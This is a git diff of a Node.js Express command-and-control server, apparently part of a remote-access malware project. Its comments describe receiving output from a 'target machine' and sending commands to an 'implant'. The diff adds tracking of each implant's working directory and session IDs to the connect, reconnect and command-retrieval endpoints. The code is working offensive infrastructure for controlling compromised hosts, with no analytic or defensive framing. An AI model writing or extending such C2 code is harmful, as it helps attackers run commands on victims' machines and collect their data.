@@ -17,9 +17,10 @@ app.use(session({
 
 app.get('/', (req, res) => {
 	sid = req.sessionID;
-	console.log((`${sid} has connected`));
+	var cwd = req.query.cwd;
+	console.log(`${sid} has connected      Current Directory: ${cwd}`);
 	fs.mkdirSync(`Sessions/${sid}`);
-	fs.writeFile(`Sessions/${sid}/${sid}.log`, "Connection Established\n", err => {
+	fs.writeFile(`Sessions/${sid}/${sid}.log`, `Connection Established\nCurrent Directory: ${cwd}\n`, err => {
   		if (err) console.error(err)
 	})
 	res.send(`${sid}`);
@@ -27,8 +28,9 @@ app.get('/', (req, res) => {
 
 app.get('/reconnect', (req, res) => {
 		var sid = req.query.sid;
-		console.log(`${sid} has reconnected.`);
-		fs.appendFile(`Sessions/${sid}/${sid}.log`, "Connection has been reestablished\n", err => {
+		var cwd = req.query.cwd;
+		console.log(`${sid} has reconnected.      Current Directory: ${cwd}`);
+		fs.appendFile(`Sessions/${sid}/${sid}.log`, `Connection has been reestablished\nCurrent Directory: ${cwd}\n`, err => {
 				if (err) console.error(err)
 		})
 		res.send(`Welcome Back`);
@@ -37,18 +39,19 @@ app.get('/reconnect', (req, res) => {
 //Used to return the output from the target machine to our C2 server
 app.get('/info', (req, res) => {
     if(req.query.info != null){
-		var sid = req.query.sid;
-    var InfoText = req.query.info;
-    console.log(`${sid}: ${InfoText}`)
-		fs.appendFile(`Sessions/${sid}/${sid}.log`, `${InfoText}\n`, err => {
-		  	if (err) console.error(err)
-		})
+				var sid = req.query.sid;
+    		var InfoText = req.query.info;
+    		console.log(`${sid}: ${InfoText}`)
+				fs.appendFile(`Sessions/${sid}/${sid}.log`, `${InfoText}\n`, err => {
+		  			if (err) console.error(err)
+				})
     }
     res.send("Information Sent!")
 });
 
 //Used to send out command to the server to be read by the implant
 app.get('/retrcommand', (req, res) => {
+		var sid = req.query.sid;
     res.send(command)
 		console.log(`${sid} has been sent ${command}.`);
 });
